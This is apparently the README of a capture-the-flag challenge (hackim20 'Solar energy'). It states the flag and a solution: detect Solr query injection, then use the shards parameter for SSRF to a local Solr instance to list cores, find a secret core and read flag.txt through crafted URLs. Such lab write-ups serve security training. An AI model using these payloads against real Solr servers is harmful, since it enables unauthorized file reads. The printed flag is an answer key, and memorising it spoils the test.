# name:Solar energy 
description: Can you mismatch energy? 

# flag: hackim20{Content_Mismatch_helps_you_all_the_Time}

# solution
- Detect solr injection with " or : (many special chars also raise the error)
- SSRF with shards to local:8939
- Find other cores available with localhost:8080/search.php?search=a%26shards=http://localhost:8983/solr/admin%26qt=/cores?wt=text  (wt=text creates a content mismatch and the response is printed )
- You find the secret core - SeCrEtSeArCh8888
- Listing all the config files in that core- http://localhost:8080/search.php?search=a%26shards=http://localhost:8983/solr/SeCrEtSeArCh8888/admin%26qt=/file?wt=text  
- Getting the flag - http://localhost:8080/search.php?search=a%26shards=http://localhost:8983/solr/SeCrEtSeArCh8888/admin%26qt=/file?wt=text%26contentType=text%2Fplain;charset%3Dutf-8%26file=flag.txt

#Installation
- ./start.sh
